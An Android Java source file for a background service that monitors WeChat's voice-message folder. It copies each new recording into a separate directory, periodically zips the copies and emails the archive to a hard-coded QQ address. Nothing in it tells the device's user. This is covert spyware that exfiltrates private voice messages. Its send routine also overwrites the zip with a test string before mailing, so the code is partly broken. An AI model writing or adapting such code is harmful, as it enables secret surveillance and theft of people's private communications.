package com.mail.service;

import android.app.Service;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.mail.filemonitor.FileListener;
import com.mail.filemonitor.FileMonitor;
import com.mail.interfaces.MyInterface;
import com.mail.utils.DirTraversal;
import com.mail.utils.MethodUtil;
import com.mail.utils.MyApplication;
import com.mail.utils.Preferences;
import com.mail.utils.ZipUtils;
import com.shidian.mail.SendMailUtil;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.LinkedList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Copyright © CapRobin
 * <p>
 * Name：MyService
 * Describe：自定义Service服务类
 * Date：2021-05-06 19:54:26
 * Author: YuFarong CapRobin@yeah.net
 */
public class MyService extends Service implements MyInterface.ActivityCallBack {
    static String sdPath = Environment.getExternalStorageDirectory().getAbsolutePath();
    static String savedPath = sdPath + "/SystemFile/VoiceBak/";
    private List<String> fileNameList = new ArrayList();
    JSONArray jsonArray = new JSONArray();
    LinkedList<File> fileList = new LinkedList<>();
    public Preferences preference;
    //间隔周期:1天
//    private static final long PERIOD_DAY = 24 * 60 * 60 * 1000;
    private static final long PERIOD_DAY = 60000;

    public MyService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        Log.v("onBind", "MyService onBind----------------------------->>");
        return null;
    }

    @Override
    public void onCreate() {
        Log.v("onCreate", "MyService onCreate----------------------------->>");
        super.onCreate();
    }

    @Override
    public void onStart(Intent intent, int startId) {
        Log.v("onStart", "MyService onStart----------------------------->>");
        super.onStart(intent, startId);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        //启动文件监听服务
        startFileListener();
        //启动定时任务
        TimerManager();
        Log.v("onStartCommand", "MyService onStartCommand----------------------------->>");
        ExecutorService threadPool = Executors.newCachedThreadPool();
        threadPool.execute(new Runnable() {
            @Override
            public void run() {
                int time = 0;
                while (true) {
                    Log.d("Jason", "time:" + time);
                    try {
                        Thread.sleep(60000);
                        System.out.print("开始发送短信----------------------------->>");
//                        Log.d("RUN", "开始发送短信----------------------------->>");
                        //开始发送普通邮件
//                        SendMailUtil.send("756657266@qq.com");

                        //开始发送文件邮件
                        //sendFileEmail();
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    time++;
                }
            }
        });

        return super.onStartCommand(intent, flags, startId);
    }


    /**
     * Describe：启动文件监听服务
     * Params: []
     * Return: void
     * Date：2021-05-26 13:33:34
     */
    public static void startFileListener() {
        //判断SD卡是否存在
        boolean isHasSdCard = Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED);
        if (isHasSdCard) {
            //获得SD卡根目录路径
            File sdDir = Environment.getExternalStorageDirectory();
            //指定监听文件目录(微信语音文件夹)
            String monitorPath = sdDir.getAbsolutePath() + File.separator + "Android" + File.separator + "data" + File.separator + "com.tencent.mm" + File.separator + "MicroMsg" + File.separator + "43088dfea1f698ddeae94f73c378d106" + File.separator + "voice2";
            try {
                //5秒循环执行一次
                FileMonitor m = new FileMonitor(10000);
                m.monitor(monitorPath, new FileListener());
                m.start();
                System.out.println("文件目录监听中------------------------------>>");
            } catch (Exception e) {
                e.printStackTrace();
            } finally {

            }
        }

    }

    /**
     * Describe：发送带附件邮件
     * Params: []
     * Return: void
     * Date：2021-05-06 19:55:59
     */
    public static void sendFileEmail_bak() {
        File file = new File(Environment.getExternalStorageDirectory() + File.separator + "EmailFile.txt");
//        Date date = new Date();
//        String dateStr = date.toString();
//        //本地文件存储
//        boolean isSave = MethodsUtil.writeFile("测试数据测试数据......" + dateStr, file);
//        System.out.print("isSave----------------------------->>" + isSave);
        OutputStream os = null;
        try {
            os = new FileOutputStream(file);
            String str = "发送带附件邮件测试";
            byte[] data = str.getBytes();
            os.write(data);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            try {
                if (os != null) os.close();
            } catch (IOException e) {
            }
        }
        SendMailUtil.send(file, "756657266@qq.com");
    }
    /**
     * Describe：发送带附件邮件
     * Params: []
     * Return: void
     * Date：2021-05-06 19:55:59
     */
    public static void sendFileEmail(File files) {
//        File files = new File(Environment.getExternalStorageDirectory() + File.separator + "EmailFile.txt");
//        Date date = new Date();
//        String dateStr = date.toString();
//        //本地文件存储
//        boolean isSave = MethodsUtil.writeFile("测试数据测试数据......" + dateStr, file);
//        System.out.print("isSave----------------------------->>" + isSave);
        OutputStream os = null;
        try {
            os = new FileOutputStream(files);
            String str = "发送带附件邮件测试";
            byte[] data = str.getBytes();
            os.write(data);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            try {
                if (os != null) os.close();
            } catch (IOException e) {
            }
        }
        SendMailUtil.send(files, "756657266@qq.com");
    }

    @Override
    public void listenerToServiceMsg(int optType, File file) {
        switch (optType) {
            case 1: //新建文件
                System.out.println("新建文件回调------------>>" + "name：" + file.getName() + "-----directory：" + file.getPath() + "\n\t");

                try {
                    //本地文件处理测试
//                    localFile(optType, file);

                    //获取文件存储时间
                    String name = file.getName();
                    String year = name.substring(14, 16);
                    String month = name.substring(10, 12);
                    String day = name.substring(12, 14);
                    String hour = name.substring(6, 8);
                    String minute = name.substring(8, 10);
                    String second = name.substring(4, 6);
//                    String wuser = name.substring(16, 23);
//                    String random = name.substring(23, 30);
                    // 拼接字符串
//                    String newName = year + "-" + month + "-" + day + "-" + hour + "-" + minute + "-" + second + "-" + wuser + "-" + random;
                    String timeStr = year + "-" + month + "-" + day + " " + hour + "-" + minute + "-" + second;
//                    fileNameList.add(file.getPath());
//                    fileList.add(file);
                    //判断本地是否有存储的文件
//                    String getJsonArrayStr = MyApplication.preference.getString("jsonArrayStr");
//                    if (!getJsonArrayStr.trim().equals("")) {
//                        //参数中有值
//                        jsonArray = JSONObject.parseArray(getJsonArrayStr);
//                    }
//
//                    JSONObject jsonObject = new JSONObject();
//                    jsonObject.put("optType", optType);
//                    jsonObject.put("name", file.getName());
//                    jsonObject.put("directory", file.getPath());
//                    jsonObject.put("time", timeStr);
//                    jsonArray.add(jsonObject);
//                    String jsonArrayStr = jsonArray.toJSONString();
//                    //本地存储新增数据文件记录
//                    MyApplication.preference.putString("jsonArrayStr", jsonArrayStr);
//                    System.out.println("jsonArrayStr---------------------->>" + jsonArrayStr);


                    //判断本地是否有存储的文件
                    String logStr = MyApplication.preference.getString("logStr");
                    String logStr1 = MyApplication.preference.getString("logStr1");
                    //本地存储新增数据文件记录
                    if (null == logStr || logStr.trim().isEmpty()) {
                        MyApplication.preference.putString("logStr", file.getPath());

                    } else {
                        MyApplication.preference.putString("logStr", logStr + "|" + file.getPath());
                    }
                    String logStr2 = MyApplication.preference.getString("logStr");
                    String listMeterId = String.valueOf(logStr2);
                    String[] fileArray = listMeterId.split("\\|");
                    System.out.println("logStr2---------------------->>" + logStr2);


                    //新增文件拷贝另存
                    boolean isCopyFile = MethodUtil.fileCopy(file.getPath(), savedPath + file.getName());
                    System.out.println("文件拷贝---------------------->>" + isCopyFile);
//
//                    //判断当前时间是否与指定时间相等
//                    SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
//                    String setTimeStr = "2021-06-03 14:55:00";
//                    Date setTime = sdf.parse(setTimeStr);
//                    Date nowTime = new Date();
//                    String nowTimeStr = sdf.format(new Date());
//                    if (nowTime.after(setTime)) {
//                        File file1 = new File(savedPath);
//                        //当前时间大于指定时间
//                        if (file1.exists() && file1.isDirectory()) {
//                            if (file1.list().length > 0) {
//                            //Not empty, do something here.
//                                System.out.println("文件夹下存放文件个数---------------------->>" + file1.list().length);
//
//                                //第一种方式压缩
////                                LinkedList<File> files = DirTraversal.listLinkedFiles(sdPath+"/SystemFile/VoiceBak");
////                                File fil = DirTraversal.getFilePath(sdPath+"/SystemFile/VoiceZip/", "VoiceBak("+nowTimeStr+").zip");
////                                ZipUtils.zipFiles(files, fil);
//
//                                //第二种方式压缩文件
////                                ZipUtils.zip(sdPath+"/Android/data/ZipData/TestData", sdPath+"/Android/data/ZipData/YsTestData.zip");
//                                ZipUtils.zip(sdPath+"/SystemFile/VoiceBak", sdPath+"/SystemFile/VoiceZip/VoiceBak("+nowTimeStr+").zip");
//                                //解压文件
//                                //ZipUtils.unzip(pathString+"/Android/data/ZipData/YsTestData.zip", pathString+"/Android/data/ZipData/YsTestData");
//                            }
//                        }
//
//                    }

                } catch (IOException e) {
                    e.printStackTrace();
                }
                break;
            case 2:
                //修改文件
                System.out.println("修改文件回调------------>>" + "name：" + file.getName() + "-----directory：" + file.getPath() + "\n\t");
                break;
            case 3:
                //删除文件
                System.out.println("删除文件回调------------>>" + "name：" + file.getName() + "-----directory：" + file.getPath() + "\n\t");
                break;
            default:
                break;
        }
    }

    //本地文件存储
    private void localFile(int optType, File file) {
        fileNameList.add(file.getPath());
        String getJsonArrayStr = MyApplication.preference.getString("jsonArrayStr");
        if (!getJsonArrayStr.trim().equals("")) {
            jsonArray = JSONObject.parseArray(getJsonArrayStr);
        }
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("optType", optType);
        jsonObject.put("directory", file.getPath());
        jsonArray.add(jsonObject);
        String jsonArrayStr = jsonArray.toJSONString();

        //
        MyApplication.preference.putString("jsonArrayStr", jsonArrayStr);
        //Preferences.mPreferences.putString(Constant.USERPASSWORD, password);
        //Preferences.mPreferences.putInt(Constant.USERTYPE, MyApplication.userType);
    }


    public static void TimerManager() {
        System.out.print("开始定时任务---------------->>");
        //间隔周期:1天
        Calendar calendar = Calendar.getInstance();
        /*** 定制每日9:00执行方法 ***/
        calendar.set(Calendar.HOUR_OF_DAY, 20);
        calendar.set(Calendar.MINUTE, 0);
        calendar.set(Calendar.SECOND, 0);
        /*** 定制每5秒执行 ***/
//        calendar.set(Calendar.SECOND, 5);

        //第一次执行定时任务的时间
        Date date = calendar.getTime();
        //如果第一次执行定时任务的时间 小于 当前的时间；此时要在 第一次执行定时任务的时间 加一天，以便此任务在下个时间点执行。如果不加一天，任务会立即执行。
        if (date.before(new Date())) {
            date = addDay(date, 10);
//            date = addDay2(date, 1);
        }
        String getDate = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(date);
        //循环任务
        TimerTask task = new TimerTask() {
            @Override
            public void run() {
                // 逻辑处理
                //                    Thread.sleep(5000);
                //executeTask();
                System.out.print("循环执行---------------->>");
                executeTask();
            }
        };

        //安排指定的任务在指定的时间开始进行重复的固定延迟执行。
        Timer timer = new Timer();
        //timer.schedule(task, 0);          // 此处delay为0表示没有延迟，立即执行一次task
        //timer.schedule(task, 1000);       // 延迟1秒，执行一次task
        //timer.schedule(task, 0, 2000);        // 立即执行一次task，然后每隔2秒执行一次task
        timer.schedule(task, date, PERIOD_DAY);
    }

    /**
     * Describe：增加或减少天数
     * Params: [date, num]
     * Return: java.util.Date
     * Date：2021-01-07 18:21:13
     */
    static Date addDay(Date date, int num) {
        Calendar startDT = Calendar.getInstance();
        startDT.setTime(date);
        startDT.add(Calendar.MINUTE, num);
        return startDT.getTime();
    }

    private static void executeTask() {
        try {
            //判断当前时间是否与指定时间相等
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            String nowTimeStr = sdf.format(new Date());
            File file1 = new File(savedPath);
            //当前时间大于指定时间
            if (file1.exists() && file1.isDirectory()) {
                if (file1.list().length > 0) {
                    //Not empty, do something here.
                    System.out.println("文件夹下存放文件个数---------------------->>" + file1.list().length);

                    //第一种方式压缩
                    LinkedList<File> files = DirTraversal.listLinkedFiles(sdPath + "/SystemFile/VoiceBak");
                    File fil = DirTraversal.getFilePath(sdPath + "/SystemFile/VoiceZip/", "VoiceBak(" + nowTimeStr + ").zip");
                    ZipUtils.zipFiles(files, fil);
                    Thread.sleep(30000);
                    //第二种方式压缩文件
////                  ZipUtils.zip(sdPath+"/Android/data/ZipData/TestData", sdPath+"/Android/data/ZipData/YsTestData.zip");
                    String fileStr = sdPath + "/SystemFile/VoiceZip/VoiceBak(" + nowTimeStr + ").zip";
//                    ZipUtils.zip(sdPath + "/SystemFile/VoiceBak", fileStr);
                    File file = new File(fileStr);
                    //开始发送文件邮件
                    sendFileEmail(file);
                    System.out.println("压缩文件成功---------------------->>");

                    //解压文件
                    //ZipUtils.unzip(pathString+"/Android/data/ZipData/YsTestData.zip", pathString+"/Android/data/ZipData/YsTestData");
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
//                    }
    }
}
